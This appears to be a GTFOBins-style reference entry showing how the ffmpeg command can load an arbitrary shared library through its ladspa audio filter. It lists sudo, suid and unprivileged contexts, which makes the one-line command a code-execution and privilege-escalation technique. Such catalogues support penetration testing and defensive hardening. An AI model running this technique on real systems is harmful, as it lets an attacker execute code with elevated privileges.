---
type: gtfobin
name: ffmpeg
platform: Unix
functions: [library-load]
tags: [gtfobin, unix, lotl]
---

# ffmpeg

## library-load

```bash
ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
reset^J
```
**Contexts:** sudo, suid, unprivileged
